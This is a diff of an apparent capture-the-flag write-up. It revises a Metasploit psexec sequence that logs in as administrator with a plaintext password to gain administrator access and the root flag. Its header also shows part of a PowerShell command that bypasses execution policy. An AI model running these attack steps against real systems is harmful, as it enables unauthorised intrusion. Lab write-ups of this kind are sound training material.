@@ -139,9 +139,11 @@ powershell.exe -command PowerShell -ExecutionPolicy bypass -noprofile -windowsty
 * It would be too easy I said to myself, but decided to give it a try anyway. Fired up msfconsole, 
 
 ```
-use windows/smb/psexec
-SMBUSer administrator
-SMBPass !R3m0te!
+msfconsole> use windows/smb/psexec
+msfconsole> set SMBUSer administrator
+msfconsole> set SMBPass !R3m0te!
+
+msfconsole> exploit
 ```
 
-and BAM! I could not believe it worked. And as easy as that, we get the root flag!
+and BAM! I could not believe it worked. And as easy as that, we get the administrator access and the root flag!
